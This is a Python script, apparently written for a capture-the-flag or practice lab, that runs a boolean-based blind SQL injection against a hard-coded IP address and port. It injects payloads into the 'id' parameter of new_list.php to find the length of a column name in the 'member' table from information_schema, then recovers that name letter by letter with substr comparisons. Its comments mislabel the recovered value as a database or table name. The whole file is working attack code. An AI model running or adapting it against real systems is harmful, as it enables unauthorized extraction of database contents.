# _*_  coding:utf-8 _*_
import requests
import sys


def lentb():
    for i in range(1,20):
        payload = '''?id=1 and (select length(column_name) from information_schema.columns where table_name='member' limit 1,1) > %s''' %i
        url = '''http://219.153.49.228:47706/new_list.php'''
        req = requests.get(url+payload+"%23") # %23--url decode is #
        if u"关于平台停机维护的通知" in req.text:
            print(i)
        else:
            print("column_length:",i)
            break

lentb()

def tbname():
    name = ""
    for j in range(1,9): # dabase length == 6
        for k in "zxcvbnmasdfghjklqwertyuiop":
            url = "http://219.153.49.228:47706/new_list.php?id=1  and substr((select column_name from information_schema.columns where table_name='member' limit 1,1),%d,1)='%s'" %(j,k)
            req = requests.get(url+"%23")
            if u"关于平台停机维护的通知" in req.text:
                name = name +k
                print(name)
                break #跳出k循环

    print("table_name:", name)

tbname()









